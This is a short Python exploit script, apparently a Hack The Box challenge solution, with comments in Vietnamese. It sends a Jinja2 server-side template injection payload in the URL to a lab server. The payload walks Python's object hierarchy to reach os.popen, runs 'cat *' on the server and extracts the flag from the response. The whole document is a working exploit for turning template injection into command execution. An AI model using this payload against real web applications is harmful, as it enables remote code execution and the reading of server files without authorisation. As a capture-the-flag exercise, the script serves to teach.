import requests

url = 'http://206.189.17.217:30262/'
string = '{{"".__class__.__mro__[1].__subclasses__()[1000].__init__.__globals__["__builtins__"]["__import__"]("os" ).popen( "cat *" ).read()}}'
# TODO: __class__ : lay doi tuong
# TODO: __mro__ : truyen nhan lop ke thua doi tuong
# TODO: --subclasses__ : nhan cac lop con cua doi tuong
rget = requests.get( url=url + string )
print(rget.text)
if 'HTB' in rget.text:
    print( rget.text.split('<str>')[1].split('</str>')[0] )
else:
    print( 'no' )
